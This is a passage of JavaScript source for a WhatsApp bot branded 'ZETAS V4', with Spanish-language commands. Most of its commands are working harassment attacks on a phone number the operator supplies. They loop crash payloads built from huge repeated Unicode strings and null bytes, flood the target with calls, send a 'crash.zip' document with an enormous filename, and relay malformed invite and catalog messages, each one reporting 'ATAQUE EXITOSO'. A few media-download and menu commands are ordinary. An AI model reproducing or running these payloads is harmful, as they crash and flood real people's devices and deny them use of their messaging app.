            sourceUrl: "https://youtube.com/@p.a.zinwebkkkkj",
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
        headerType: 4,
        viewOnce: true
    }, { quoted: m })

for (let r = 0; r < 10; r++) {
await invisSqL(target)
await invisSqL(target)
await invisSqL(target)
await invisSqL(target)
await invisSqL(target)
await invisSqL(target)
await invisSqL(target)
await invisSqL(target)
await invisSqL(target)
await invisSqL(target)
await invisSqL(target)
await invisSqL(target)
        }
    } catch (error) {
        console.error("Error en", error);
        reply("Error", error);
    }
    }
break

case 'crash': {
  if (!q) return enviar(`Ejemplo:\n${prefix + command} 521234567890`);
  const target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await stikerNotif(target);
  break;
}
case "spam-call":{
if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO APENAS MI CREADOR PUEDE USAR*\n`)
let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let isTarget = pelaku + "@s.whatsapp.net"
let doneios = `
   𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 ᶻ 𝗓 𐰁
⿻ Tarjeta : @${isTarget.split('@')[0]}
⿻ Tipo : 𝐒𝐩𝐚𝐦 𝐂𝐚𝐥𝐥 📞
⿻ Estado : Exitoso ✅️
`
   try {
    conn.sendMessage(from, {
        image: { url: './src/catalogo.jpg' },
        caption: doneios,
        footer: "</> Porfavor espera 10 minutos para evitar la suspensión",
        buttons: [
            {
                buttonId: "#", 
                buttonText: { displayText: '⟅ ▿ ⿻ 𝐙𝐄𝐓𝐀𝐒 ϟ ‌𝐂𝐋𝐢𝐄𝐍𝐓 ⿻ ▿ ⟆' },
                type: 1
            }
        ],
        contextInfo: {
        externalAdReply: {
            title: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛",
            body: "𝐒𝐩𝐚𝐦 𝐂𝐚𝐥𝐥 📞", 
            thumbnail: fs.readFileSync ('./src/opa.webp'),
            sourceUrl: "https://youtube.com/@p.a.zinwebkkkkj",
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
        headerType: 4,
        viewOnce: true
    }, { quoted: m })

for (let r = 0; r < 20; r++) {
 await sendOfferCall(isTarget)
        }
    } catch (error) {
        console.error("Error en", error);
        reply("Error", error);
    }
    }
break

case 'crash-ios': {
if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO SOLO MI CREADOR PUEDE USAR*\n`)
if (!q) return reply(`ejemplo: ${prefix + command} 52×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 50; i++) {
await thunderblast_ios1(target)
}
reply(`『 𝐀𝐓𝐀𝐐𝐔𝐄 𝐄𝐗𝐢𝐓𝐎𝐒𝐎 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝐄𝐗𝐢𝐓𝐎𝐒𝐎 🎗

☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️`)
conn.sendMessage(from, {audio: fs.readFileSync('./src/audio.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: info })
}
break

case 'pin':
if (!isBot && !isCreator) return 
    if (!q) return enviar(`\`Proporciona el texto de búsqueda.\`\n*Ejemplo:* *${prefix + command} Goku*`);
    try {
        await conn.sendMessage(from, { react: { text: '🎗️', key: m.key } });
        let res;
        try {
            // Sekzo 1 
            res = await axios.get(`https://api.nexfuture.com.br/api/pesquisas/pinterest?query=${encodeURIComponent(q)}`, {
                responseType: 'arraybuffer',
                headers: { 'User-Agent': 'Mozilla/5.0' }
            });
        } catch (e) {
            console.warn('valiendo pinga ');
            // Sekzo 2
            res = await axios.get(`https://api.siputzx.my.id/api/s/pinterest?query=${encodeURIComponent(q)}`, {
                responseType: 'arraybuffer',
                headers: { 'User-Agent': 'Mozilla/5.0' }
            });
        }
        const buffer = Buffer.from(res.data);
        await conn.sendMessage(from, {
  image: buffer,
  caption: `\n> Resultado para: ${q}\n\n\`© ⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻\``,
  buttons: [
    {
      buttonId: `${prefix}pin ${q}`,
      buttonText: { displayText: 'Sɪɢᴜɪᴇɴᴛᴇ' },
      type: 1
    }
  ],
  viewOnce: true,
  headerType: 4
}, { quoted: zetas });

    } catch (err) {
        conn.sendMessage(from, { text: 'Error' }, { quoted: m });
    }
    break;
   
case 'atraso': {
if (!isBot && !isCreator) return 
if (!q) return reply(`ejemplo: ${prefix + command} 52×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 50; i++) {
await ZeroRadiactive(target)
await sleep(5000)
await ZeroRadiactive(target)
await sleep(5000)
await ZeroRadiactive(target)
await sleep(5000)
await ZeroRadiactive(target)
}
reply(`『 𝐀𝐓𝐀𝐐𝐔𝐄 𝐄𝐗𝐢𝐓𝐎𝐒𝐎 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝐄𝐗𝐢𝐓𝐎𝐒𝐎 🎗

☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️`)
conn.sendMessage(from, {audio: fs.readFileSync('./src/audio.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: info })
}
break
case 'instagram':
case 'ig': {
if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO SOLO MI CREADOR PUEDE USAR*\n`)
  if (!q || !q.includes('instagram.com')) {
    return enviar('*Ejemplo de uso*:\n' + `${prefix + command} https://www.instagram.com/reel/abc123`);
  }
  try {
    const axios = require('axios');
    const res = await axios.get(`https://api.nexfuture.com.br/api/downloads/instagram/dl/v2?url=${encodeURIComponent(q)}`);
    const reels = res.data?.resultado?.results;
    if (!reels || !Array.isArray(reels) || reels.length === 0) {
      return enviar('*No sé encontró el video*');
    }
    const video = reels.find(r => r.type === 'video');
    const videoHD = video?.variants?.find(v => v.quality === 'HD') || video?.variants?.[0];
    if (!videoHD?.url) {
      return enviar('Enlace invalido .');
    }
    await conn.sendMessage(from, {
      video: { url: videoHD.url },
      mimetype: 'video/mp4',
      caption: `*\`ღAquí esta tu vídeoღ\`*`
    }, { quoted: n });

    await conn.sendMessage(from, { react: { text: '✅', key: m.key } });

  } catch {
    enviar('Error');
  }
}
break;

case 'copiar': {
  if (!m.message) return enviar('No hay mensaje.');
  console.log(JSON.stringify(m.message, null, 2));
  enviar('✅ JSON mostrado en consola')};
  break;

case 'menu':
if (!isBot && !isCreator) return
const os = require('os')
var deviceType = m.key.id.length > 21 ? 'Android' : m.mkey.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp web'
const time = hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const data = date = dataa = moment.tz('America/Sao_Paulo').format('DD/MM/YY')
await conn.sendMessage(from, {
image: {url: './src/foto.jpg'},
"contextInfo": {
"externalAdReply": {
"title": `by 𝐌𝐚𝐢𝐤𝐞𝐥`,
"body": '☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️',
"mediaType": 4,
"thumbnail": web,
"jpegThumbnail": web,
"MediaUrl": 'https://youtube.com/@p.a.zinwebkkkkj',
"sourceUrl": 'https://whatsapp.com/channel/0029VaorTv7AzNbwdT52Rj2C'
}
},
caption: `
╭⪫═════════════════⪫
│ ☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️
│ ✅ *𝖴𝗌𝗎𝖺𝗿𝗂𝗈:* ${pushname}
│ ✅ *𝖧𝗈𝗋𝖺:* ${hora}
│ ✅ *𝖣𝖺𝗍𝖺:* ${data}
│ ✅ *Estado:* online
│ ✅ *𝖣𝗂𝗌𝗉𝗈𝗌𝗂𝗏𝗈:* ${deviceType}
│ ✅ *𝖯𝗅𝖺𝗍𝖺𝖿𝗈𝗋𝗆𝖺:* ${os.platform()}
│ ✅ *𝖧𝗈𝗌𝗍𝖭𝖺𝗆𝖾:* ${os.hostname()}
╰═════════════════╯`,
footer: `𝐛y 𝐌𝐚𝐢𝐤𝐞𝐥`,
buttons: [

{buttonId: '..',
buttonText: {displayText: '.'},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: "☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️",
sections: [
{
title: "MENU All",
rows: [
{
title: " 《 • 》",
description: "☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️",
id: `menu_android`,
},
]}]})
}
},
],
headerType: 1,
viewOnce: true
})
break
case 'button':
if (!isBot && !isCreator) return
await conn.sendMessage(from, {
image: { url: './src/foto.jpg' },
"contextInfo": {
  "externalAdReply": {
    "title": `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 & 𝐌𝐚𝐢𝐤𝐞𝐥`,
    "body": 'ola',
    "mediaType": 4,
    "thumbnail": web,
    "jpegThumbnail": web,
    "MediaUrl": 'https://youtube.com/@p.a.zinwebkkkkj',
    "sourceUrl": 'https://whatsapp.com/channel/0029VaorTv7AzNbwdT52Rj2C'
  }
},
caption: `☠️⃟⿻𝐙𝐄𝐓𝐀𝐒 ϟ 𝐕𝟒⿻⃟☠️`,
footer: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 & 𝐌𝐚𝐢𝐤𝐞𝐥`,
buttons: [
  { buttonId: 'sekzo', buttonText: { displayText: sekzo3 }, type: 10 },
  { buttonId: 'sekzo2', buttonText: { displayText: sekzo3}, type: 10 },
  { buttonId: 'sekzo4', buttonText: { displayText: sekzo3 }, type: 10 },
  { buttonId: 'sekzo7', buttonText: { displayText: sekzo3 }, type: 10 },
],
headerType: 1,
viewOnce: true
});
break;
case 'menu_android': { 
if (!isBot) return
const aña = {
  key: {
    fromMe: false,
    stanzaId: "ABCDEF123456",
    remoteJid: "status@broadcast",
    participant: "867051314767696@bot"
  },
  message: {
    extendedTextMessage: {
      text: 'by 𝐌𝐚𝐢𝐤𝐞𝐥'
    }
  }
}
await conn.sendMessage(from, { text: `
╭─────────────⪩ 
│ \`𝑪𝒓𝒂𝒔𝒉\`
│  𝒜𝓃𝒹𝓇𝑜𝒾𝒹
├ ${prefix}crash-home 
├ ${prefix}button 
├ ${prefix}atraso
├ ${prefix}spam-call
├    𝒫𝒞
├ ${prefix}doc-pc
├    𝐼𝑜𝓈
├ ${prefix}crash-ios
├   𝒢𝓇𝓊𝓅𝑜𝓈
├ ${prefix}canal-adm
├ ${prefix}button 
│
╰─────────────⪨`}, 
{ quoted: aña }); 
}
break; 

case 'doc-pc':
if (!isBot && !isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : body.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
          jumlah = "900"
          const repetir = 'ྃ'.repeat(77000)
          conn.sendMessage(from, {
            document: { url: './travas/crash.zip' },
            mimetype: 'application/nu',
            fileName: '𝐁𝐚𝐲 𝐁𝐚𝐲 𝐏𝐂  🖥🪐' + repetir + repetir
          }, { participant: { jid: Pe }})
          break
case "loc-pc":
if (!isBot && !isCreator) return
for (let i = 0; i < 15; i++) {
const puto = 'ྃ'.repeat(8765)
conn.sendMessage(from,{
  location:{
   degreesLatitude: 9999, 
   degreesLongitude: 9999, 
   name: "👾" + puto + puto }})
}
break

case 'crash-pc':
if (!isBot && !isCreator) return
for (let i = 0; i < 50; i++) {
conn.relayMessage(from, {
viewOnceMessage: {
message: {
"extendedTextMessage": 
{
"text":"ꦿꦷꦹ".repeat(99999),
"contextInfo": {
fromMe: false,
participant: '0@s.whatsapp.net',
remoteJid: 'status@broadcast',
"quotedMessage":{"interactiveResponseMessage": {"body": {"text": "madara carai","format": "DEFAULT"},"nativeFlowResponseMessage": {"name": "galaxy_message","paramsJson": `{\\\"screen_2_OptIn_0\\\":true,\\\"screen_2_OptIn_1\\\":true,\\\"screen_1_Dropdown_0\\\":\\\"Snowi Pointer\\\",\\\"screen_1_DatePicker_1\\\":\\\"${Date.now() + 1000}\\\",\\\"screen_1_TextInput_2\\\":\\\"xxxx@xxx.com\\\",\\\"screen_1_TextInput_3\\\":\\\"99999999\\\",\\\"screen_0_TextInput_0\\\":\\\"nutten${"\0".repeat(10000)}\\\",\\\"screen_0_TextInput_1\\\":\\\"zero\\\",\\\"screen_0_Dropdown_2\\\":\\\"007-Bond\\\",\\\"screen_0_RadioButtonsGroup_3\\\":\\\"0_true\\\",\\\"flow_token\\\":\\\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\\\"}`,"version": 3}}},
}
}
}
}
}, {participant : { jid : from}})
await sleep (999)
}
await sleep (999)
console.log(`\n\n\n𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 ᶻ 𝗓 𐰁\n\n\n`)
break
case "canal-adm":
const travas = `${"ꦾ".repeat(90000)}`
if (!isBot && !isCreator) return
conn.relayMessage(from,{"newsletterAdminInviteMessage":{"newsletterJid":"120363282786345717@newsletter","newsletterName":"🗣🗣🗣🗣" + travas + travas + travas ,"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADMARwMBIgACEQEDEQH/xAAoAAEBAQAAAAAAAAAAAAAAAAAAAQYBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAM4AAAgqCoAAAAAAAAAKBAAAA//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8Af//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AJ//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AJ//Z","caption":"𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁","inviteExpiration":"1717872809"}},{})
conn.relayMessage(from,{extendedTextMessage: {text: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁`}},{})
break

case 'catalogo-pc': {
if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO APENAS MI CREADOR PUEDE USAR*\n`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./src/foto.jpg') }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": ` 饾唵饾唴馃専饾唵饾吙饾吙饾吙饾吙蜔 鈥� 汀釚餐熖♂穽痞饾吙猢徸傗湕扫饾吙猢庰潊筐潊酷穽鉂⊥熱煚釚� 汀蜏$汀蜏 釤Ｍ熥傖穽夕趣蜔饾吙扫讉岱嶁⿴ 饾唵饾唴馃専饾唵饾吙饾吙饾吙饾吙蜔 鈥� 汀釚餐熖♂穽痞饾吙猢徸傗湕扫饾吙猢庰潊筐潊酷穽鉂⊥熱煚釚� 汀蜏$汀蜏 釤Ｍ熥傖穽夕趣蜔饾吙扫讉岱嶁⿴` ,
"description": `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁`,
"currencyCode": `BR`,
"footerText": `⽶⽳⽰⼜⽂`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁`,
"url": "wa.me/526421147692"
},
"businessOwnerJid": "526421147692@s.whatsapp.net",
}
}), { userJid: from })
conn.relayMessage(from, catalog.message, { messageId: catalog.key.id })
}
break
case 'play':
if (!isBot && !isCreator) return enviar(`\n ❌ *COMANDO NEGADO SOLO MI CREADOR PUEDE USAR*\n`)
    try {
        if (!q) return await conn.sendMessage(from, { text: `*Ejemplo:* ${prefix + command} "Montagem Agressivo Da Felicidade"` }, { quoted: m });
        let url, title, views, desc, thumb, duration;
        try {
            const Api = await fetchJson(`https://api.nexfuture.com.br/api/pesquisas/youtube?query=${encodeURIComponent(q)}`);
            const res = Api.resultado;
            if (!res || !res.url) throw new Error("Nexfuture no encontró nada");

            url = res.url;
            title = res.titulo;
            views = res.views;
            desc = res.descricao;
            thumb = res.imagem;
            duration = res.duracao;

        } catch (e) {
            console.log('ohhno');

            const search = await fetchJson(`https://cloudkutube.eu/api/yts?q=${encodeURIComponent(q)}`);
            if (!search || !search.result || !search.result[0]) throw 'No se encontraron resultados.';

            const vid = search.result[0];
            url = vid.url;
            title = vid.title;
            views = vid.views;
            desc = vid.description || '-';
            thumb = vid.thumbnail;
            duration = vid.duration;
        }

        const caption = `*Pedido solicitado por:* *@${m.sender.split('@')[0]}*\n
> ★ *Titulo:* ${title}
> ღ *Vistas:* ${views}
> ✎ *Descripción:* ${desc}
*1:28 ❍──────╼ ${duration} ↻ ⊲ Ⅱ ⊳ ↺*

_*By : *`;

        await conn.sendMessage(from, {
            image: { url: thumb },
            caption: caption,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m });
        let downloadUrl;
        try {
            const downloadApi = await fetchJson(`https://api.nexfuture.com.br/api/downloads/youtube/mp3/v3?url=${encodeURIComponent(url)}`);
            if (!downloadApi.download || !downloadApi.download.downloadLink) throw "Fallo Nexfuture";

            downloadUrl = downloadApi.download.downloadLink;

        } catch (e) {
            const audio = await fetchJson(`https://cloudkutube.eu/api/yta?url=${encodeURIComponent(url)}`);
            if (!audio || !audio.result || !audio.result.url) throw 'No se pudo obtener el audio.';

            downloadUrl = audio.result.url;
        }
        const axios = require('axios');
        const fs = require('fs');
        const path = require('path');
        const { execSync } = require('child_process');

        const filePath = path.join(__dirname, 'audio.mp3');
        const writer = fs.createWriteStream(filePath);

        const response = await axios({
            url: downloadUrl,
            method: 'GET',
            responseType: 'stream'
        });
        response.data.pipe(writer);
        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
        const outputPath = path.join(__dirname, 'audio-convertido.opus');
        execSync(`ffmpeg -i "${filePath}" -c:a libopus -b:a 128k "${outputPath}"`);
        await conn.sendMessage(from, {
            audio: fs.readFileSync(outputPath),
            mimetype: "audio/ogg; codecs=opus",
            ptt: false
        }, { quoted: m });
        fs.unlinkSync(filePath);
        fs.unlinkSync(outputPath);
    } catch (error) {
        console.log('ERROR COMPLETO:', error);
        return await conn.sendMessage(from, { text: "❌ Ocurrió un error:\n```" + error + "```" }, { quoted: m });
    }
    break;
default:
}
} catch(e) {
console.log(e)
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})